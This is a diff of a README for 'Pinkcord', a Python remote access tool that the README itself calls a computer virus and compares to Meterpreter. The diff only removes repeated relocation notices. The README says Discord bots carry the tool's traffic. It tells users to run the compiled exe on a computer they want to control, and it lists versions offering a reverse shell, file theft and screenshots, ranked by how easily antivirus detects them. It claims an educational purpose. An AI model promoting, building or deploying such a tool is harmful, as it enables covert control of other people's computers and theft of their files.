@@ -1,6 +1,3 @@
-> [!CAUTION]
-> **Pinkcord** has been relocated to a new repository as of September 19, 2024. You can find it [here](https://www.github.com/jvr2022/pinkcord-V2).
-
 
 ![Banner](https://github.com/xanonDev/pinkcord/blob/main/pic/banner.png)
 [![Support](https://img.shields.io/badge/Support-Buy%20me%20a%20Coffee-yellow)](https://www.buymeacoffee.com/pinkcord)
@@ -10,16 +7,10 @@
 [![GitHub Forks](https://img.shields.io/github/forks/xanonDev/pinkcord.svg?style=flat&label=Forks&color=blue)](https://github.com/xanonDev/pinkcord)
 [![OlD Discord](https://img.shields.io/discord/1146757562646151168?label=Discord&logo=discord&logoColor=white&color=7289da)](https://discord.gg/gX72uKxJr7)
 
-> [!CAUTION]
-> **Pinkcord** has been relocated to a new repository as of September 19, 2024. You can find it [here](https://www.github.com/jvr2022/pinkcord-V2).
-
 Pinkcord is a computer virus written in Python that utilizes Discord bots to transmit information. Please note that this program was created solely for educational purposes, and it should not be used to engage in any illegal activities. The use of Pinkcord may have severe legal consequences, including the banning of your Discord account. Download and use this program responsibly.
 to put it simply, pinkcord can be compared to meterpreter from metasploit
 only pinkcord works outside the local network and transmits data via discord
 and slightly different functions
-
-> [!CAUTION]
-> **Pinkcord** has been relocated to a new repository as of September 19, 2024. You can find it [here](https://www.github.com/jvr2022/pinkcord-V2).
 
 ## How to Use
 
@@ -29,23 +20,14 @@ and slightly different functions
 4. Follow the instructions provided.
 5. if the program compiles to exe. just enable it on the computer you want to control
 
-> [!CAUTION]
-> **Pinkcord** has been relocated to a new repository as of September 19, 2024. You can find it [here](https://www.github.com/jvr2022/pinkcord-V2).
-
 ## Platforms
 the program was written for windows, so a large amount may not work on normal linux, and even more so on termux or mac. it is possible that in the future there will be an adaptation of pinkcord to more platforms
-
-> [!CAUTION]
-> **Pinkcord** has been relocated to a new repository as of September 19, 2024. You can find it [here](https://www.github.com/jvr2022/pinkcord-V2).
 
 ## Versions
 you can choose the versions at setup
 - `pinkcord_minimal.py` - the minimal version, the hardest to detect, has only reverse shell functions [less than 8mb]
 - `pinkcord_lite.py` - has everything that the minimum version has, but unlike it, it can upload files and steal them, it has the function of taking screenshots, it can be slightly more detected by antiviruses [up to 35mb with a pillow installed, without a pillow about 15mb]
 - `pinkcord.py` - it has all the features but antiviruses often detect it [up to 45mb with a pillow installed, without a pillow about 20mb]
-
-> [!CAUTION]
-> **Pinkcord** has been relocated to a new repository as of September 19, 2024. You can find it [here](https://www.github.com/jvr2022/pinkcord-V2).
 
 ## Commands
 
